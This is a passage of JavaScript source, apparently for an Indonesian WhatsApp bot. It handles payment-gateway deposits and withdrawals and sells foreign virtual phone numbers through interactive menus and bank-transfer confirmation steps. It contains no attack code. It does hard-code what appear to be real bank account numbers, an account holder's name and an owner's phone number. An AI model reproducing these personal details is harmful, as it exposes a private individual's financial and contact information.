                                    `◉ Status: ${data.data.status}\n` +
                                    `◉ Diterima: ${toRupiah(data.data.get_balance)}\n` +
                                    `◉ Tanggal: ${data.data.date}\n\n` +
                                    `Terimakasih.`);
                                sych.sendMessage(m.key.remoteJid, {
                                    delete: {
                                        remoteJid: jid,
                                        fromMe: true,
                                        id: messageId
                                    }
                                });
                            } else if (data.data.status === 'failed') {
                                clearInterval(interval);
                                sycreply(`Sangat Disayangkan Sekali. Pembayaran Kamu Dibatalkan Oleh Sistem.`);
                            }
                        }, 5000);

                        const timeout = setTimeout(async () => {
                            clearInterval(interval);
                            const response = await axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
                                id: id,
                                api_key: config.api.secret_key
                            });

                            const data = response.data;

                            if (!data.data) return sycreply(data.message);
                            sycreply(`⚠️ *Pembayaran Dibatalkan Otomatis* setelah 5 menit tanpa konfirmasi keberhasilan.`);
                        }, 300000);
                    }
                } catch (error) {
                    console.error('Error fetching data:', error);
                    sycreply('Terjadi kesalahan, silahkan coba lagi nanti.');
                }
                break;
            }

            // Transfer
            case 'transfer':
            case 'wd_balance':
            case 'wd': {
                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');

                if (!query) return sycreply(`Example: ${prefix}${command} 3000.`);
                const nominal = query;
                if (nominal < 3000) return sycreply('Jumlah minimal: 3000.');

                const reffId = generateRandomText(10);

                try {
                    const response = await axios.post(`${config.api.base_url}/api/h2h/transfer/create`, {
                        reff_id: reffId,
                        bank_code: 'DANA',
                        account_number: config.api.dana.number,
                        owner_name: config.api.dana.name,
                        email_address: config.api.dana.email,
                        phone_number: config.api.dana.number,
                        note: 'Withdraw Saldo',
                        nominal: nominal,
                        api_key: config.api.secret_key
                    });

                    const data = response.data;

                    console.log(data.message);

                    if (!data.data) return sycreply(data.message);

                    const text = `Reff id: ${data.data.reff_id}\nNama: ${data.data.name}\nNo DANA: ${data.data.number}\nNominal: Rp ${toRupiah(data.data.nominal)}\nFee: Rp ${toRupiah(data.data.fee)}\nTotal: Rp ${toRupiah(data.data.total)}\nDibuat pada: ${data.data.date}`;
                    sych.sendMessage(m.key.remoteJid, {
                        text: text
                    }, {
                        quoted: fkontak
                    }).then(sentMessage => {
                        checkPaymentStatus(data.data.id, sentMessage.key.id);

                    });

                    async function checkPaymentStatus(id, messageId) {
                        const interval = setInterval(async () => {
                            const response = await axios.post(`${config.api.base_url}/api/h2h/transfer/status`, {
                                id: id,
                                api_key: config.api.secret_key
                            });

                            const data = response.data;

                            if (data.data.status == 'success') {
                                clearInterval(interval);
                                sycreply('Berhasil melakukan transfer.');
                            } else if (data.data.status == 'failed') {
                                clearInterval(interval);
                                sycreply('Gagal melakukan transfer.');
                            }
                        }, 5000);

                    }
                } catch (error) {
                    console.error('Error fetching data:', error);
                    sycreply('Saldo tidak cukup!');
                }
                break;
            }

            // Profile
            case 'check_balance':
            case 'cek_saldo': {
                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');

                const response = await axios.post(`${config.api.base_url}/api/h2h/get-profile/balance`, {
                    api_key: config.api.secret_key
                });

                const data = response.data;
                sycreply(`Jumlah saldo anda: Rp ${toRupiah(data.data.balance)}`);
                break;
            }

            /* End Features area */

            /*default: {
                sycreply('Perintah tidak dikenali. Gunakan .menu untuk melihat daftar perintah.');
            }*/
        


// Case produk
case 'pproduk': {
  if (!isRegistered) {
      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');}
    console.log("Case 'produk' dijalankan."); // Debugging

    // Data produk
    const products = [
        { title: "Nomor USA", id: "produk_usa", description: "Harga: Rp 20.000 - Tersedia" },
        { title: "Nomor UK", id: "produk_uk", description: "Harga: Rp 25.000 - Tersedia" },
        { title: "Nomor Kanada", id: "produk_canada", description: "Harga: Rp 22.000 - Tersedia" },
        { title: "Nomor Jerman", id: "produk_germany", description: "Harga: Rp 30.000 - Tersedia" },
        { title: "Nomor Jepang", id: "produk_japan", description: "Harga: Rp 35.000 - Tersedia" }
    ];

    // Pesan instruksi
    let instructionText = "Halo " + " Berikut List Menu Kami\n\n⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂\n⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕\n⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂\n⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂\n⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔\n⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿\n⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿\n⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃\n⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈\n⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈\n⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈\n⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈\n⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈\n⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈\n\n";

    // Tombol interaktif
    let buttons = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Pilih Produk",
                sections: [
                    {
                        title: "Nomor Kosong",
                        rows: products.map(product => ({
                            title: product.title,
                            id: product.id, // Menggunakan ID produk langsung
                            description: product.description
                        }))
                    }
                ]
            })
        }
    ];

    // Membuat pesan interaktif untuk produk
    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: instructionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Produk Nomor Kosong',
                                subtitle: 'Pilih produk nomor kosong',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: buttons
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'produk_usa': {
    console.log("Produk USA dipilih."); // Debugging

    // Data produk USA
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Melanjutkan Pembayaran",
                sections: [
                    {
                        title: "Pilih Metode Pembayaran",
                        rows: [
                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
                        ]
                    }
                ]
            })
        }
    ];

    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
        `- Produk: Nomor USA\n` +
        `- Harga: Rp 20.000\n\n` +
        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: paymentText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pembayaran Produk USA',
                                subtitle: 'Melanjutkan Pembayaran',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'produk_uk': {
    console.log("Produk UK dipilih."); // Debugging

    // Data produk UK
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Melanjutkan Pembayaran",
                sections: [
                    {
                        title: "Pilih Metode Pembayaran",
                        rows: [
                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
                        ]
                    }
                ]
            })
        }
    ];

    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
        `- Produk: Nomor UK\n` +
        `- Harga: Rp 25.000\n\n` +
        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: paymentText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pembayaran Produk UK',
                                subtitle: 'Melanjutkan Pembayaran',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'produk_canada': {
    console.log("Produk Kanada dipilih."); // Debugging

    // Data produk Kanada
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Melanjutkan Pembayaran",
                sections: [
                    {
                        title: "Pilih Metode Pembayaran",
                        rows: [
                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
                        ]
                    }
                ]
            })
        }
    ];

    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
        `- Produk: Nomor Kanada\n` +
        `- Harga: Rp 22.000\n\n` +
        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: paymentText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pembayaran Produk Kanada',
                                subtitle: 'Melanjutkan Pembayaran',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'produk_germany': {
    console.log("Produk Jerman dipilih."); // Debugging

    // Data produk Jerman
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Melanjutkan Pembayaran",
                sections: [
                    {
                        title: "Pilih Metode Pembayaran",
                        rows: [
                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
                            ]
                    }
                ]
            })
        }
    ];

    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
        `- Produk: Nomor Jerman\n` +
        `- Harga: Rp 30.000\n\n` +
        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: paymentText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pembayaran Produk Jerman',
                                subtitle: 'Melanjutkan Pembayaran',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'produk_japan': {
    console.log("Produk Jepang dipilih."); // Debugging

    // Data produk Jepang
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Melanjutkan Pembayaran",
                sections: [
                    {
                        title: "Pilih Metode Pembayaran",
                        rows: [
                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
                        ]
                    }
                ]
            })
        }
    ];

    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
        `- Produk: Nomor Jepang\n` +
        `- Harga: Rp 35.000\n\n` +
        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: paymentText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pembayaran Produk Jepang',
                                subtitle: 'Melanjutkan Pembayaran',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'transfer_bank': {
    console.log("Case 'transfer_bank' dijalankan."); // Debugging

    // Data bank
    const banks = [
        { title: "Bank BRI", id: "bank_bri", description: "Nomor Rekening: 574701011764505 - Status: 🟢" },
        { title: "Bank CIMB", id: "bank_cimb", description: "Nomor Rekening: 763802276000 - Status: 🟢" }
    ];

    // Pesan instruksi
    let instructionText = "💳 *Informasi Rekening Bank*\n\nPilih bank untuk melakukan transfer.";

    // Tombol interaktif
    let buttons = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Pilih Bank untuk Transfer",
                sections: [
                    {
                        title: "Bank Transfer",
                        rows: banks.map(bank => ({
                            title: bank.title,
                            id: bank.id, // Menggunakan ID bank langsung
                            description: bank.description
                        }))
                    }
                ]
            })
        }
    ];

    // Membuat pesan interaktif untuk memilih bank
    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: instructionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pilih Bank untuk Pembayaran',
                                subtitle: 'Pilih Bank Anda',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: buttons
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'bank_bri': {
    console.log("Case 'bank_bri' dijalankan."); // Debugging

    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
    const confirmationText = `
            *${n}BANK BRI${n}*
            *${n}ATAS NAMA : GALANG${n}* 
            *${n}Nomor Rekening : 574701011764505${n}*
            *${n}STATUS :${n}* 🟢
        
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: "Proses Transaksi",
            sections: [
                {
                    title: "Confirm Transaksi",
                    rows: [
                        { title: "Confirm", id: "confirm_bri_payment", description: "Konfirmasi Pembayaran BRI" },
                        { title: "Upload", id: "upload_bri_proof", description: "Kirim Bukti Transfer BRI" }
                    ]
                }
            ]
        })
    },
    {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
            display_text: "Salin",
            copy_code: "574701011764505"
        })
    }
];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Konfirmasi Pembayaran Bank BRI',
                                subtitle: 'Terima kasih atas pembayaran Anda!',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'confirm_bri_payment': {
const name = getUserName(m.sender);
    console.log("Case 'confirm_bri_payment' dijalankan."); // Debugging

    // Pesan konfirmasi pembayaran
    const confirmationText = `
⚠️ *Pending Transaksi:*

📌 *BANK BRI* 
- ATAS NAMA: GALANG
- Nomor Rekening: 574701011764505

⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*)`;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Tutup Transaksi",
                sections: [
                    {
                        title: "Close",
                        rows: [
                            { title: "Tutup", id: "close_payment", description: "Selesai" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Klik tombol di bawah untuk aksi lanjutan."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Status Pending 🔴',
                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging

        // Mengirim pesan otomatis ke owner
        const sender = m.sender;
        await sych.sendMessage('50251731838@s.whatsapp.net', {
            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
            mentions: [sender]
        }, { quoted: fkontak });

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses confirm_cimb_payment:", error); // Debugging
    }
}
break;


//UPLOAD
case 'upload_bri_proof': {
    console.log("Case 'upload_bri_proof' dijalankan."); // Debugging

    // Pesan instruksi pengunggahan
    const confirmationText = `
📝 *Instruksi Pengunggahan Bukti Transfer:*
1. Pastikan bukti transfer terlihat jelas.
2. Screnshoot yang diterima: JPG, PNG, atau PDF.
3. Kirim bukti transfer Anda dengan Screnshoot.

📌 *Bank BRI:* 
- ATAS NAMA: GALANG
- Nomor Rekening: 574701011764505
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Next",
                sections: [
                    {
                        title: "Lanjutkan Transaksi",
                        rows: [
                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
                        ]
                    }
                ]
            })
        },




    ];


try {
    // Path ke file gambar lokal
    const imagePath = './src/media/brii.png'; // Ganti dengan path yang sesuai

    // Membaca gambar dari file lokal
    const imageBuffer = fs.readFileSync(imagePath);

    // Menyiapkan media (gambar)
    const mediaMessage = await prepareWAMessageMedia(
        { image: imageBuffer }, // Menggunakan buffer gambar lokal
        { upload: sych.waUploadToServer }
    );

    // Membuat pesan dengan gambar
    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: confirmationText
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
                            title: 'Pengunggahan Bukti Transfer BRI',
                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
                            hasMediaAttachment: true, // Menandakan bahwa ada media
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: button
                        })
                    })
                }
            }
        },
        { quoted: fkontak }
    );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses upload_bri_proof:", error); // Debugging
    }
}
break;


case 'close_payment': {
    console.log("Case 'close_payment' dijalankan."); // Debugging

    // Pesan untuk menutup transaksi
    const closingText = `
⚠️ *Transaksi Telah Ditutup:*
Jika Anda membutuhkan bantuan lebih lanjut, jangan ragu untuk menghubungi kami.

✨ Semoga hari Anda menyenangkan!
    `;
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Status Pembatalan",
                sections: [
                    {
                        title: "Pilihan Lainnya",
                        rows: [
                            { title: "Pesan Ulang", id: "reorder", description: "Pesan ulang produk ini" },
                            { title: "Hubungi CS", id: "contact_cs", description: "Hubungi customer service" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: closingText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "©Langz!"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Transaksi Selesai',
                                subtitle: 'Terima kasih atas pembayaran Anda!'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            }) // Tidak ada tombol, hanya menutup
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses close_payment:", error); // Debugging
    }
}
break;

case 'submit_bri_proof': {
    console.log("Case 'submit_bri_proof' dijalankan."); // Debugging

    // Pesan konfirmasi pengunggahan bukti
    const proofSubmissionText = `

⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Kirim Bukti",
                sections: [
                    {
                        title: "Proses Unggah",
                        rows: [
                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: proofSubmissionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Silakan unggah bukti Anda."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Unggah Bukti Transfer',
                                subtitle: 'Pengunggahan bukti transfer Anda.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses submit_bri_proof:", error); // Debugging
    }
}
break;

case 'upload_file': {
    console.log("Case 'upload_file' dijalankan."); // Debugging
const name = getUserName(m.sender);
        const sender = m.sender;
    // Pesan untuk memberitahukan bahwa pembayaran akan dicek
    const fileUploadText = `
📥 *Bukti Transfer Anda Sedang Diperiksa:*
Pembayaran Anda akan segera di cek, harap menunggu beberapa saat, Owner akan segera merespon.\n\n${n}📬 Mengirim Pesan Ke Owner : ${name} sudah mengirimkan bukti transaksi mohon segera di cek${n}\n\nTerimakasih

🔍 Jika ada masalah atau kendala, jangan ragu untuk menghubungi owner.
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Proses Transaksi",
                sections: [
                    {
                        title: "Status Pembayaran",
                        rows: [
                            { title: "Batalkan Order", id: "cancel_order", description: "Batalkan pesanan Anda" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: fileUploadText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Pembayaran Anda sedang kami verifikasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Verifikasi Pembayaran',
                                subtitle: 'Tunggu sebentar, pembayaran sedang diperiksa.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
